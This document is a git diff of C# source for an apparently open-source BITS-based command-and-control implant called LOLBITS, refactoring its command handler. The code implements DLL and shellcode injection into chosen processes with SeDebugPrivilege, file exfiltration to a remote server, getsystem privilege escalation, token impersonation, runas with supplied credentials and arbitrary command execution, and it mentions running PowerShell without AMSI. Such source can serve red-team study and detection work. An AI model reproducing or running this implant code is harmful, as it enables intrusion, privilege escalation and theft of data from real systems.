@@ -28,7 +28,7 @@ namespace LOLBITS
         private string TempPath;
         private TokenManager TokenManager;
         private Jobs JobsManager;
-        private static SyscallManager syscall;
+        private SyscallManager syscall;
 
         public Controller(string Id, string url,string password)
         {
@@ -36,8 +36,9 @@ namespace LOLBITS
             Url = url;
             P = password;
             JobsManager = new Jobs(Url);
-            TokenManager = new TokenManager();
             syscall = new SyscallManager();
+            TokenManager = new TokenManager(syscall);
+
             if (Environment.GetEnvironmentVariable("temp") != null)
             {
                 TempPath = Environment.GetEnvironmentVariable("temp");
@@ -57,7 +58,7 @@ namespace LOLBITS
         { 
 
             string startBits = "sc start BITS";
-            TokenUtils.ExecuteCommand(startBits);
+            Utils.ExecuteCommand(startBits);
             Thread.Sleep(500);
             string filePath = TempPath + @"\" + Id;
 
@@ -139,211 +140,217 @@ namespace LOLBITS
 
             string rps = "";
 
-            switch (file.Commands[0])
+            try
             {
-                case "inject_dll":
-                    {
-                        string fileP = TempPath + @"\" + Id;
-                        string headers = "reqid: " + Auth + "\r\ncontid: " + Contid;
-
-                        if (JobsManager.Get(Id, fileP, headers,BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
+                switch (file.Commands[0])
+                {
+                    case "inject_dll":
                         {
-                            try
+                            string fileP = TempPath + @"\" + Id;
+                            string headers = "reqid: " + Auth + "\r\ncontid: " + Contid;
+
+                            if (JobsManager.Get(Id, fileP, headers, BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
                             {
-                                Assembly dll = LoadDll(fileP);
-                                string method = file.Commands[1];
-                                string args = "";
-                                for (int i = 2; i < file.Commands.Length; i++)
+                                try
                                 {
-                                    args += file.Commands[i];
-                                    if (i < file.Commands.Length)
-                                        args += " ";
+                                    Assembly dll = LoadDll(fileP);
+                                    string method = file.Commands[1];
+                                    string args = "";
+                                    for (int i = 2; i < file.Commands.Length; i++)
+                                    {
+                                        args += file.Commands[i];
+                                        if (i < file.Commands.Length)
+                                            args += " ";
+                                    }
+                                    string[] arguments = new string[] { args };
+
+                                    LauncherDll.Main(method, arguments, dll);
+                                    rps = "Dll injected!";
                                 }
-                                string[] arguments = new string[] { args };
-
-                                LauncherDll.Main(method, arguments, dll);
-                                rps = "Dll injected!";
+                                catch (Exception)
+                                {
+                                    rps = "ERR:Fatal error ocurred while trying to inject the dll.\n";
+                                }
                             }
-                            catch (Exception)
+                            else
                             {
-                                rps = "ERR:Fatal error ocurred while trying to inject the dll.\n";
+                                rps = "ERR:Dll not found!\n";
                             }
+
+
+                            break;
                         }
-                        else
+
+                    case "inject_shellcode":
                         {
-                            rps = "ERR:Dll not found!\n";
+                            string fileP = TempPath + @"\" + Id;
+                            string headers = "reqid: " + Auth + "\r\ncontid: " + Contid;
+                            int pid = -1;
+                            if (file.Commands.Length >= 2)
+                                pid = int.Parse(file.Commands[1]);
+
+
+                            if (JobsManager.Get(Id, fileP, headers, BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
+                            {
+                                byte[] sh;
+                                GetEncryptedFileContent(fileP, out sh);
+
+                                try
+                                {
+
+                                    LauncherShellcode.Main(sh, syscall, pid);
+                                    rps = "Shellcode injected!\n";
+                                }
+                                catch (Exception)
+                                {
+                                    rps = "ERR:Fatal error ocurred while trying to inject shellcode.\n";
+                                }
+                            }
+                            else
+                            {
+                                rps = "ERR:Shellcode file not found!\n";
+                            }
+
+                            break;
+                        }
+
+                    case "powershell":
+                        {
+                            rps = Utils.ExecuteCommand("powershell -V 2 /C Write-Host hi");
+
+                            if (rps.Replace("\n", "").Replace(" ", "") == "hi")
+                            {
+                                LauncherPowershell.Main(file.Commands[1], file.Commands[2]);
+                                rps = "You should have your Powershell at " + file.Commands[1] + ":" + file.Commands[2] + "!\n";
+
+                            }
+                            else
+                            {
+                                rps = "Version 2 of Powershell not available. Try injecting EvilSalsa by CyberVaca in order to use powershell without am" + "si.\n";
+                            }
+
+                            break;
+                        }
+
+                    case "send":
+                        {
+                            string fileP = TempPath + @"\" + Id;
+                            string headers = "reqid: " + Auth + "\r\ncontid: " + Contid;
+
+                            if (JobsManager.Get(Id, fileP, headers, BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
+                            {
+                                File.Copy(fileP, file.Commands[1], true);
+                                rps = "Dowload finished.\n";
+                            }
+                            else
+                            {
+                                rps = "ERR:Download failed!\n";
+                            }
+
+                            break;
+                        }
+                    case "exfiltrate":
+                        {
+                            if (File.Exists(file.Commands[1]))
+                            {
+                                if (JobsManager.Send(file.Commands[2], file.Commands[1]))
+                                {
+                                    rps = "Exfiltration succeed.\n";
+
+                                }
+                                else
+                                    rps = "ERR:Exfiltration failed!\n";
+                            }
+                            else
+                                rps = "ERR:File to exfiltrate not found!\n";
+
+                            break;
+                        }
+                    case "getsystem":
+                        {
+
+                            if (Utils.IsHighIntegrity(syscall))
+                                rps = TokenManager.getSystem() ? "We are System!\n" : "ERR:Process failed! Is this process running with high integrity level?\n";
+                            else
+                                rps = "ERR:Process failed! Is this process running with high integrity level?\n";
+
+                            break;
+                        }
+
+                    case "rev2self":
+                        {
+                            TokenManager.Rev2Self();
+                            rps = "Welcome back.\n";
+
+                            break;
                         }
 
 
-                        break;
-                    }
-
-                case "inject_shellcode":
-                    {
-                        string fileP = TempPath + @"\" + Id;
-                        string headers = "reqid: " + Auth + "\r\ncontid: " + Contid;
-                        int pid = -1;
-                        if (file.Commands.Length >= 2)
-                            pid = int.Parse(file.Commands[1]);
-
-
-                        if (JobsManager.Get(Id, fileP, headers, BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
+                    case "runas":
                         {
-                            byte[] sh;
-                            GetEncryptedFileContent(fileP, out sh);
+                            string user = "", domain = "", password = "";
+                            string[] userData = file.Commands[1].Split('\\');
+                            if (userData.Length == 1)
+                            {
+                                domain = ".";
+                                user = userData[0];
+                            }
+                            else
+                            {
+                                domain = userData[0];
+                                user = userData[1];
+                            }
 
+                            password = file.Commands[2];
+
+                            rps = TokenManager.Runas(domain, user, password) ? "Success!" : "ERR:Invalid credentials.";
+
+
+                            break;
+                        }
+
+                    case "list":
+                        {
+                            rps = GetProcessInfo();
+                            break;
+                        }
+
+                    case "impersonate":
+                        {
                             try
                             {
-
-                                LauncherShellcode.Main(sh, syscall, pid);
-                                rps = "Shellcode injected!\n";
+                                if (TokenManager.Impersonate(int.Parse(file.Commands[1])))
+                                    rps = "Impersonation achieved!\n";
+                                else
+                                    rps = "ERR: Not enough privileges!\n";
                             }
-                            catch (Exception)
+                            catch
                             {
-                                rps = "ERR:Fatal error ocurred while trying to inject shellcode.\n";
+                                rps = "ERR: Impersonation failed!\n";
                             }
+
+                            break;
+
                         }
-                        else
+
+                    case "exit":
                         {
-                            rps = "ERR:Shellcode file not found!\n";
+                            Environment.Exit(0);
+                            break;
                         }
 
-                        break;
-                    }
-
-                case "powershell":
-                    {
-                        rps = TokenUtils.ExecuteCommand("powershell -V 2 /C Write-Host hi");
-
-                        if (rps.Replace("\n","").Replace(" ","") == "hi")
+                    default:
                         {
-                            LauncherPowershell.Main(file.Commands[1], file.Commands[2]);
-                            rps = "You should have your Powershell at " + file.Commands[1] + ":" + file.Commands[2] + "!\n";
-
-                        }
-                        else
-                        {
-                            rps = "Version 2 of Powershell not available. Try injecting EvilSalsa by CyberVaca in order to use powershell without am" + "si.\n";
+                            rps = Utils.ExecuteCommand(file.Commands[0]);
+                            break;
                         }
 
-                        break;
-                    }
 
-                case "send":
-                    {
-                        string fileP = TempPath + @"\" + Id;
-                        string headers = "reqid: " + Auth + "\r\ncontid: " + Contid;
-
-                        if (JobsManager.Get(Id, fileP, headers, BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
-                        {
-                            File.Copy(fileP, file.Commands[1], true);
-                            rps = "Dowload finished.\n";
-                        }
-                        else
-                        {
-                            rps = "ERR:Download failed!\n";
-                        }
-
-                        break;
-                    }
-                case "exfiltrate":
-                    {
-                        if (File.Exists(file.Commands[1]))
-                        {
-                            if (JobsManager.Send(file.Commands[2], file.Commands[1]))
-                            {
-                                rps = "Exfiltration succeed.\n";
-
-                            } else
-                                rps = "ERR:Exfiltration failed!\n";
-                        }
-                        else
-                            rps = "ERR:File to exfiltrate not found!\n";
-
-                        break;
-                    }
-                case "getsystem":
-                    {
-
-                        if (TokenUtils.IsHighIntegrity())
-                            rps = TokenManager.getSystem() ? "We are System!\n" : "ERR:Process failed! Is this process running with high integrity level?\n";
-                        else
-                            rps = "ERR:Process failed! Is this process running with high integrity level?\n";
-
-                        break;
-                    }
-
-                case "rev2self":
-                    {
-                        TokenManager.Rev2Self();
-                        rps = "Welcome back.\n";
-                      
-                        break;
-                    }
-
-
-                case "runas":
-                    {
-                        string user = "", domain = "", password = "";
-                        string[] userData = file.Commands[1].Split('\\');
-                        if (userData.Length == 1)
-                        {
-                            domain = ".";
-                            user = userData[0];
-                        }
-                        else
-                        {
-                            domain = userData[0];
-                            user = userData[1];
-                        }
-
-                        password = file.Commands[2];
-
-                        rps = TokenManager.Runas(domain, user, password) ? "Success!" : "ERR:Invalid credentials.";
-
-
-                        break;
-                    }
-
-                case "list": 
-                    {
-                        rps = GetProcessInfo();
-                        break;
-                    }
-
-                case "impersonate":
-                    {
-                        try
-                        {
-                            if (TokenManager.Impersonate(int.Parse(file.Commands[1])))
-                                rps = "Impersonation achieved!\n";
-                            else
-                                rps = "ERR: Not enough privileges!\n";
-                        }
-                        catch
-                        {
-                            rps = "ERR: Impersonation failed!\n";
-                        }
-
-                        break;
-
-                    }
-
-                case "exit":
-                    {
-                        Environment.Exit(0);
-                        break;
-                    }
-
-                default:
-                    {
-                        rps = TokenUtils.ExecuteCommand(file.Commands[0]);
-                        break;
-                    }
-
-                   
+                }
+            } catch
+            {
+                rps = "ERR: Something went wrong!";
             }
-
             Response response = new Response(rps, Auth);
             string filePath = TempPath + @"\" + Id + ".txt";
             EncryptResponseIntoFile(filePath, response);
@@ -609,7 +616,7 @@ namespace LOLBITS
         internal delegate int NtCreateThreadEx32(out IntPtr hThread, Int32 DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, bool CreateSuspended,
             uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, out UNKNOWN32 lpBytesBuffer);
 
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)] //NtCreateThreadEx expect different kind of parameters for 32 and 64 bits processes injection. 
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)] //NtCreateThreadEx expect different kind of parameters for 32 and 64 bits procesess. 
         internal delegate int NtCreateThreadEx64(out IntPtr hThread, long DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, bool CreateSuspended,
             ulong StackZeroBits, ulong SizeOfStackCommit, ulong SizeOfStackReserve, out UNKNOWN64 lpBytesBuffer);
 
@@ -625,7 +632,7 @@ namespace LOLBITS
             thr1.Start(a);
         }
 
-        public unsafe void ExecuteShellcodeInMemory(object args) //activar sedebug 
+        public unsafe void ExecuteShellcodeInMemory(object args)        
         {
 
             object[] argumentos = (object[])args;
@@ -637,12 +644,14 @@ namespace LOLBITS
             if(pid != -1)
             {
                 IntPtr token = IntPtr.Zero;
-                TokenUtils.getProcessToken(Process.GetCurrentProcess().Handle, TokenUtils.TokenAccessFlags.TOKEN_ADJUST_PRIVILEGES, out token);
+                Utils.getProcessToken(Process.GetCurrentProcess().Handle, Utils.TokenAccessFlags.TOKEN_ADJUST_PRIVILEGES, out token, syscall); 
+
                 List<string> l = new List<string>();
                 l.Add("SeDebugPrivilege");
-                TokenUtils.enablePrivileges(token, l);
+                Utils.enablePrivileges(token, l);
 
-                TokenUtils.getProcessHandle(pid, out handle, TokenUtils.ProcessAccessFlags.All);
+                Utils.getProcessHandle(pid, out handle, Utils.ProcessAccessFlags.CreateThread | Utils.ProcessAccessFlags.QueryInformation | 
+                    Utils.ProcessAccessFlags.VirtualMemoryOperation | Utils.ProcessAccessFlags.VirtualMemoryWrite | Utils.ProcessAccessFlags.VirtualMemoryRead);
             }
 
 
